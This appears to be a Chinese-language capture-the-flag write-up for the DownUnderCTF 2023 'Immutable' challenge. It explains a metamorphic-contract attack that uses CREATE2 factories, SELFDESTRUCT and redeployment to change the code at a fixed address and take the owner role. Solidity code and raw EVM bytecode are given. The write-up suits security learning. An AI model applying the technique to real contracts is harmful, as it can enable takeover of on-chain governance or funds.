# DownUnderCTF 2023 Immutable Writeup

## 题目简述

挑战先要求提交一个运行时代码长度恰好为 13 字节的合约，之后又要求同一地址的代码长度变为 1337 字节。第二次检查通过后，调用者会成为 `owner`。这需要构造可变形合约：销毁旧代码，再在相同地址部署不同运行时代码。

## 解题过程

普通 `CREATE` 部署地址由部署者地址和 nonce 决定。为了让子合约地址可以重建，先部署一个固定的 `CREATE2` 工厂，由它以固定 salt 创建 `CREATE` 工厂；后者再用 nonce 1 部署目标合约。

```solidity
contract Create2Deployer {
    function deployCreate1() external returns (address) {
        return address(new Create1Deployer{salt: bytes32(0)}());
    }
}

contract Create1Deployer {
    function deploy(bytes memory initCode) external returns (address deployed) {
        assembly {
            deployed := create(0, add(initCode, 0x20), 12)
        }
    }

    function die() external {
        selfdestruct(payable(address(0)));
    }
}
```

第一次部署使用 12 字节初始化代码：

```text
600d8060093d393df36000ff
```

它返回 13 字节运行时代码，其中有效指令为 `PUSH1 0; SELFDESTRUCT`，其余由零填充。把该地址提交给 `submitContractForReview` 后，调用目标合约销毁自身，再销毁 `Create1Deployer`。

随后通过同一个 `Create2Deployer`、同一个 salt 重建 `Create1Deployer`。部署者地址和创建 nonce 都恢复为原值，所以再次执行 `CREATE` 会得到同一目标地址。第二次初始化代码为：

```text
61053980600a3d393df36969
```

其中 `0x0539=1337`，初始化代码从偏移 10 复制并返回 1337 字节，超出自身代码的部分由 EVM 以零填充。此时同一地址的 `extcodesize` 变成 1337，调用：

```solidity
challenge.reviewContract();
```

便会把 `owner` 设为玩家地址，得到：

```text
DUCTF{this_is_how_t0rn4d0_cash_got_rekt}
```

## 方法总结

关键不是修改既有字节码，而是控制地址推导：`CREATE2` 固定中间部署者地址，重建后的 `CREATE` nonce 又固定最终地址。该解法依赖题目链采用的旧式 `SELFDESTRUCT` 删除代码语义；在启用 EIP-6780 的新链上，跨交易销毁与重部署通常不会保持同样效果。
